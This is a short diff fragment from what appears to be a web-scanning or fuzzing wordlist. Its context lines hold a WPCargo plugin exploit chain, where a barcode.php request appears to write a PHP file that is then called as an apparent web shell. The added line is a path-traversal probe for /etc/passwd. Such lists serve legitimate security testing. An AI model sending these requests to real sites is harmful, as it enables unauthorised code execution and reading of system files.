@@ -17574,3 +17574,4 @@ http://www.google.com/
 /wp-content/plugins/wpcargo/includes/barcode.php?text=x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx&sizefactor=.090909090909&size=1&filepath=2vUHYaJucqhxvC3xsiNNp9t3JBt.php
 /wp-content/plugins/wpcargo/includes/2vUHYaJucqhxvC3xsiNNp9t3JBt.php?1=var_dump
 /wp-content/plugins/wpcargo/includes/2vUHYaJucqhxvC3xsiNNp9t3JBt.php
+/../../etc/passwd
